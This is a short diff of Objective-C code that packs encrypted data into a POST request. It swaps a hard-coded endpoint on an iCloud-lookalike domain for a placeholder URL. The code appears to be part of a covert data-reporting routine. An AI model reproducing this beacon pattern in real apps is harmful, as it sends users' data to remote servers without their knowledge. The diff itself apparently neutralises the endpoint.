@@ -197,7 +197,7 @@
     [concatenatedData appendData:verLenData];
     [concatenatedData appendData:encryptData];
     
-    NSURL *url = [NSURL URLWithString:@"http://init.icloud-analysis.com"];
+    NSURL *url = [NSURL URLWithString:@"http://your.url.here"];
     NSMutableURLRequest *request =  [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:30];
     
     [request setHTTPMethod:@"POST"];
